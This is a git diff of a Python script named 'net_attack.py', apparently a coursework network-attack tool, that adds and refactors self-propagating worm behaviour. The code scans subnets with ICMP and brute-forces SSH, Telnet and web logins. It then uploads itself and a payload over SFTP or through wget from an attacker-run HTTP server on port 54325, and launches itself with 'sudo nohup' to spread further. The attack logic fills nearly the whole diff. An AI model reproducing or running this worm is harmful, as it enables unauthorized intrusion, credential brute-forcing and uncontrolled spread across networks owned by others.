@@ -1,8 +1,9 @@
 #!/usr/bin/python3
+import constants
 import concurrent.futures
 
 from scapy.all import *
-from os import path, stat
+from os import path
 from shutil import copyfile, rmtree
 from telnetlib import Telnet
 from paramiko import SSHClient, AutoAddPolicy
@@ -28,6 +29,10 @@ def main():
     password_list = read_file_from_list(password_file)
 
     self_propagate = False
+    deploy_file = False
+    deployment_filename = ".deploy"
+    script_filename = "net_attack.py"
+
     ip_list = []
     print("[+] Determining which IP addresses are reachable...")
     if "-t" in arguments:
@@ -41,7 +46,8 @@ def main():
     elif "-L" in arguments and "-P" in arguments:
         self_propagate = True
         ip_list = scan_for_active_ips()
-        deploy_file_to_server(password_file)
+        deploy_file_to_server(password_file, deployment_filename, script_filename)
+        deploy_file = True
     else:
         help("Missing target argument")
 
@@ -53,12 +59,12 @@ def main():
         if self_propagate:
             help("-d argument cannot be used with -L and -P")
         deployment_file = get_parameter(arguments, "-d")
-        deploy_file_to_server(deployment_file)
+        deploy_file_to_server(deployment_file, deployment_filename, script_filename)
+        deploy_file = True
 
-    deployed = False
-    overwrite_existing = self_propagate
     print("[+] Received %d response(s). Beginning attack!\n" % len(ip_list))
     for ip in ip_list:
+        deployed = False
         print("********** %s **********" % ip)
         for port in port_list:
             port_open = scan_port(ip, port)
@@ -75,10 +81,10 @@ def main():
                 username_password = bruteforce_function(ip, port, username, password_list)
                 if username_password:
                     print("Successfully logged into port %d with %s" % (port, username_password))
-                    if port == 22 or port == 23 and not deployed:
+                    if deploy_file and not deployed and (port == 22 or port == 23):
                         credentials = username_password.split(":")
-                        deployed = transfer_file(ip, credentials[0], credentials[1], overwrite_existing, port,
-                                                 self_propagate)
+                        deployed = transfer_file(ip, credentials[0], credentials[1], port, self_propagate,
+                                                 deployment_filename, script_filename)
 
         print("********** %s **********\n" % ip)
 
@@ -92,7 +98,26 @@ def scan_port(ip, port):
         return False
 
 
+def bruteforce_ssh(ip, port, username, passwords):
+    print("Attempting bruteforce with SSH")
+    response = ""
+    for password in passwords:
+        try:
+            client = SSHClient()
+            client.set_missing_host_key_policy(AutoAddPolicy())
+            client.connect(ip, username=username, password=password, port=port, timeout=3)
+            response = "%s:%s" % (username, password)
+            break
+        except:
+            pass
+
+        client.close()
+
+    return response
+
+
 def bruteforce_telnet(ip, port, username, passwords):
+    print("Attempting bruteforce with Telnet")
     response = ""
 
     login_prompt = encode_in_ascii("login:")
@@ -119,24 +144,8 @@ def bruteforce_telnet(ip, port, username, passwords):
     return response
 
 
-def bruteforce_ssh(ip, port, username, passwords):
-    response = ""
-    for password in passwords:
-        try:
-            client = SSHClient()
-            client.set_missing_host_key_policy(AutoAddPolicy())
-            client.connect(ip, username=username, password=password, port=port, timeout=3)
-            response = "%s:%s" % (username, password)
-            break
-        except:
-            print("Unable to establish SSH connection")
-
-        client.close()
-
-    return response
-
-
 def bruteforce_web(ip, port, username, passwords):
+    print("Attempting bruteforce to Web Server")
     response = ""
     base_url = "http://%s:%d" % (ip, port)
     index_url = "%s/index.php" % base_url
@@ -159,46 +168,43 @@ def read_file_from_list(file):
     return file_contents_list
 
 
-def is_reachable(ip):
-    ans = sr1(IP(dst=ip, ttl=64) / ICMP(), timeout=2)
+def is_reachable(dst_ip, src_ip=None, timeout=2):
+    ip = IP(src=src_ip, dst=dst_ip, ttl=64) if src_ip else IP(dst=dst_ip, ttl=64)
+    ans = sr1(ip / ICMP(), timeout=timeout)
     return ans is not None
 
 
-def transfer_file(ip, username, password, overwrite_existing, port, self_propagate):
-    successful = False
+def transfer_file(ip, username, password, port, self_propagate, deployment_filename, script_filename):
     target_directory = get_target_directory(ip, username)
+    try:
+        transfer_file_function = {
+            22: transfer_file_with_sftp,
+            23: transfer_file_with_http_server
+        }[port]
+    except KeyError:
+        return False
 
-    if port == 22:
-        successful = transfer_file_with_sftp(ip, username, password, target_directory, overwrite_existing,
-                                             self_propagate)
-    elif port == 23:
-        if scan_port(ip, 22):
-            try:
-                successful = transfer_file_with_sftp(ip, username, password, target_directory, overwrite_existing,
-                                                     self_propagate)
-                if not successful:
-                    successful = transfer_file_with_http_server(ip, username, password, target_directory,
-                                                                overwrite_existing, self_propagate)
-            except:
-                successful = transfer_file_with_http_server(ip, username, password, target_directory,
-                                                            overwrite_existing, self_propagate)
+    successful = transfer_file_function(ip, username, password, target_directory, self_propagate, deployment_filename,
+                                  script_filename)
 
+    if successful:
+        if self_propagate:
+            print("Self propagation successful. %s started on %s" % (script_filename, ip))
         else:
-            successful = transfer_file_with_http_server(ip, username, password, target_directory, overwrite_existing,
-                                                        self_propagate)
+            print("File deployment successful")
 
     return successful
 
 
-def transfer_file_with_sftp(ip, username, password, target_directory, overwrite_existing, self_propagate):
+def transfer_file_with_sftp(ip, username, password, target_directory, self_propagate, deployment_filename,
+                            script_filename):
+    information_message = "Attempting self propagation with SFTP" if self_propagate else "Deploying file with SFTP"
+    print(information_message)
     client = SSHClient()
     try:
         client.set_missing_host_key_policy(AutoAddPolicy())
         client.connect(ip, username=username, password=password)
         with client.open_sftp() as sftp_client:
-            deployment_filename = ".deploy"
-            script_filename = "net_attack.py"
-
             local_dir = os.getcwd()
 
             local_deployment_path = "%s/%s" % (local_dir, deployment_filename)
@@ -208,19 +214,24 @@ def transfer_file_with_sftp(ip, username, password, target_directory, overwrite_
 
             sftp_client.chdir(target_directory)
             dir_contents = sftp_client.listdir()
-            if deployment_filename not in dir_contents or overwrite_existing:
+            if deployment_filename in dir_contents:
+                if not self_propagate:
+                    sftp_client.remove(target_deployment_path)
+                    sftp_client.put(localpath=local_deployment_path, remotepath=target_deployment_path)
+            else:
                 sftp_client.put(localpath=local_deployment_path, remotepath=target_deployment_path)
-                if self_propagate:
-                    if script_filename in dir_contents:
-                        return True
 
-                    sftp_client.put(localpath=local_script_path, remotepath=target_script_path)
+            if self_propagate:
+                if script_filename in dir_contents:
+                    return True
+
+                sftp_client.put(localpath=local_script_path, remotepath=target_script_path)
 
                 commands = [
                     "cd %s\n" % target_directory,
                     "sudo -S chmod +x %s\n" % script_filename,
-                    "ubuntu\n",
-                    "sudo nohup ./net_attack.py -u %s -p 22,23 -f .deploy -L -P >/dev/null 2>&1 &\n" % username
+                    "%s\n" % password,
+                    "sudo nohup ./%s -u %s -p 22,23 -f %s -L -P >/dev/null 2>&1 &\n" % (script_filename, username, deployment_filename)
                 ]
 
                 channel = client.invoke_shell()
@@ -249,10 +260,15 @@ def transfer_file_with_sftp(ip, username, password, target_directory, overwrite_
         client.close()
 
 
-def transfer_file_with_http_server(ip, username, password, target_directory, overwrite_existing, self_propagate):
+def transfer_file_with_http_server(ip, username, password, target_directory, self_propagate, deployment_filename,
+                                   script_filename):
+    information_message = "Attempting self propagation with HTTP" if self_propagate else "Deploying file with HTTP"
+    print(information_message)
+
     telnet_port = 23
 
     server_ip = get_server_ip_from_ip(ip)
+    port_number = get_port_number()
 
     login_prompt = encode_in_ascii("login:")
     username_input = encode_in_ascii("%s\n" % username)
@@ -265,14 +281,25 @@ def transfer_file_with_http_server(ip, username, password, target_directory, ove
 
     saved = encode_in_ascii("saved")
     cd_command = encode_in_ascii("cd %s\n" % target_directory)
-    remove_old_file_if_exists_command = encode_in_ascii("[ -f .deploy ] && rm .deploy\n")
-    wget_deployment_file_command = encode_in_ascii("[ ! -f .deploy ] && wget %s:54325/.deploy -q\n" % server_ip)
-    wget_script_file_command = encode_in_ascii("[ ! -f net_attack.py ] && wget %s:54325/net_attack.py -q\n" % server_ip)
 
-    chmod_command = encode_in_ascii("sudo chmod +x net_attack.py\n")
+    remove_old_file_if_exists_command = "[ -f %s ] && rm %s\n"
+    wget_if_not_exists_command = "[ ! -f %s ] && wget %s:%d/%s -q -o /dev/null\n"
+
+    remove_deploy_if_exists_command = encode_in_ascii(
+        remove_old_file_if_exists_command % (deployment_filename, deployment_filename))
+
+    wget_deployment_file_command = encode_in_ascii(
+        wget_if_not_exists_command % (deployment_filename, server_ip, port_number, deployment_filename))
+
+    wget_script_file_command = encode_in_ascii(
+         wget_if_not_exists_command % (script_filename, server_ip, port_number, script_filename))
+
+    chmod_command = encode_in_ascii("sudo chmod +x %s\n" % script_filename)
     sudo_prompt = encode_in_ascii("[sudo] password for %s:" % username)
+
     start_net_attack_command = encode_in_ascii(
-        "sudo nohup ./net_attack.py -u %s -p 22,23 -f .deploy -L -P >/dev/null 2>&1 &\n" % username)
+        "sudo nohup ./%s -u %s -p 22,23 -f %s -L -P >/dev/null 2>&1 &\n" % (
+            script_filename, username, deployment_filename))
     wait_for = encode_in_ascii("WAIT FOR")
 
     connection = Telnet(ip, port=telnet_port)
@@ -291,8 +318,8 @@ def transfer_file_with_http_server(ip, username, password, target_directory, ove
             return False
 
         connection.write(cd_command)
-        if overwrite_existing:
-            connection.write(remove_old_file_if_exists_command)
+        if not self_propagate:
+            connection.write(remove_deploy_if_exists_command)
         connection.write(wget_deployment_file_command)
 
         if self_propagate:
@@ -326,59 +353,11 @@ def get_server_ip_from_ip(ip):
     return server_ip
 
 
-# def start_ssh_with_telnet_if_not_running(ip, port, username, password):
-#     ssh_port = 22
-#     if scan_port(ip, ssh_port):
-#         return True
-#
-#     login_prompt = encode_in_ascii("login:")
-#     username_input = encode_in_ascii("%s\n" % username)
-#     password_prompt = encode_in_ascii("Password:")
-#     password_input = encode_in_ascii("%s\n" % password)
-#     welcome_output = encode_in_ascii("Welcome to")
-#
-#     sudo_check = encode_in_ascii("id")
-#     sudo_check_response = "27(sudo)"
-#     start_sshd = encode_in_ascii("sudo service sshd start\n")
-#     sudo_prompt = encode_in_ascii("[sudo] password for %s:" % username)
-#
-#     connection = Telnet(ip, port=port)
-#     try:
-#         connection.read_until(login_prompt)
-#         connection.write(username_input)
-#         connection.read_until(password_prompt)
-#         connection.write(password_input)
-#         banner = connection.read_until(welcome_output, timeout=1)
-#         if welcome_output not in banner:
-#             return False
-#
-#         connection.write(sudo_check)
-#         check = connection.read_until(sudo_check_response, timeout=1)
-#         if sudo_check_response not in check:
-#             return False
-#
-#         connection.write(start_sshd)
-#         start_sshd = connection.read_until(sudo_prompt, timeout=1)
-#         if sudo_prompt in start_sshd:
-#             connection.write(encode_in_ascii("%s\n" % password))
-#             connection.read_until(encode_in_ascii("WAITING TO START"), timeout=5)
-#     except Exception as ex:
-#         print(ex)
-#         return False
-#     finally:
-#         connection.close()
-#
-#     return True
-
-
-def deploy_file_to_server(file):
+def deploy_file_to_server(file, deployment_filename, script_filename):
     current_directory = os.getcwd()
 
-    script_name = "net_attack.py"
-    deployment_file_name = ".deploy"
-
     current_deployment_file_location = "%s/%s" % (current_directory, file)
-    current_script_file_location = "%s/%s" % (current_directory, script_name)
+    current_script_file_location = "%s/%s" % (current_directory, script_filename)
 
     deployment_directory = "%s/net_attack_deployment" % current_directory
 
@@ -388,10 +367,11 @@ def deploy_file_to_server(file):
     os.mkdir(deployment_directory)
     os.chdir(deployment_directory)
 
-    copyfile(current_deployment_file_location, deployment_file_name)
-    copyfile(current_script_file_location, script_name)
+    copyfile(current_deployment_file_location, deployment_filename)
+    copyfile(current_script_file_location, script_filename)
 
-    server = ("", 54325)
+    port_number = get_port_number()
+    server = ("", port_number)
     http = HTTPServer(server, SimpleHTTPRequestHandler)
 
     http_server_thread = threading.Thread(target=http.serve_forever, name="HTTP Server Thread")
@@ -470,46 +450,59 @@ def scan_for_active_ips():
 
 
 def scan_against_interface(interface):
-    interface_ip = get_if_addr(interface)
-    base_ip = interface_ip[0: (interface_ip.rfind('.') + 1)]
+    src_ip = get_if_addr(interface)
+    base_ip = src_ip[0: (src_ip.rfind('.') + 1)]
     replies_list = []
+    print(src_ip)
+    print(base_ip)
 
-    # with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
-    #     executor.map(send(interface_ip, base_ip, replies_list), range(1, 255))
+    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+        executor.map(send(src_ip, base_ip, replies_list), range(1, 255))
 
-    if replies_list is not None:
-        replies_list = []
-        print("Interface IP " + interface_ip)
-        if interface_ip == "10.0.0.1":
-            replies_list.append("10.0.0.2")
-        elif interface_ip == "10.0.0.2":
-            replies_list.append("10.0.0.3")
-        elif interface_ip == "10.0.0.3":
-            replies_list.append("10.0.0.4")
-        elif interface_ip == "10.0.0.4":
-            replies_list.append("10.0.0.5")
-        elif interface_ip == "10.0.0.5":
-            replies_list.append("10.0.0.6")
-        print(replies_list)
-        return replies_list
+    return replies_list
 
 
-# TODO: merge with is_reachable
-def send(interface_ip, base_ip, replies_list):
+def send(src_ip, base_ip, replies_list):
     # Sends an Echo Request to the Networks base IP concatenated with a particular IP for the final octet.
     # The interface_ip is set in the Echo Request as the source. If an Echo Reply is not received in 4 seconds then the
     # request times out.
-    def send_icmp_request(ip):
-        destination = base_ip + str(ip)
-        reply = sr1(IP(src=interface_ip, dst=destination, ttl=64) / ICMP(), timeout=4)
-        if reply is not None:
-            replies_list.append(reply.src)
+    def send_icmp_request(last_ip_octal):
+        dst_ip = base_ip + str(last_ip_octal)
+        print("Src: %s Dst: %s" % (src_ip, dst_ip))
+        if is_reachable(dst_ip, 4, src_ip):
+            replies_list.append(dst_ip)
 
     return send_icmp_request
 
 
 def encode_in_ascii(s):
     return s.encode("ascii")
+
+
+def get_port_number():
+    return 54325
+
+
+def get_value(shortcut):
+    value = {
+        "LOGIN_PROMPT": "login:",
+        "ONE_VALUE_INPUT": "%s",
+        "PASSWORD_PROMPT": "Password:",
+        "WELCOME_OUTPUT": "Welcome to",
+        "DEPLOY_FILENAME": ".deploy",
+        "SCRIPT_FILENAME": "net_attack.py",
+        "ID_CMD": "id",
+        "SUDO_CHECK_RESPONSE": "23(sudo)",
+        "SAVED": "saved",
+        "REMOVE_OLD_FILE_IF_PRESENT_CMD": "[ -f %s ] && rm %s",
+        "WGET_CMD": "[ ! -f %s ] && wget %s:54325/%s -q",
+        "WAIT_FOR_OUTPUT": "WAIT FOR",
+        "CD_CMD": "cd %s",
+        "CHMOD": "sudo -S chmod +x %s",
+        "START_ATTACK": "sudo nohup ./net_attack.py -u %s -p 22,23 -f .deploy -L -P >/dev/null 2>&1 &"
+    }[shortcut]
+
+    return value
 
 
 def help(error_message):
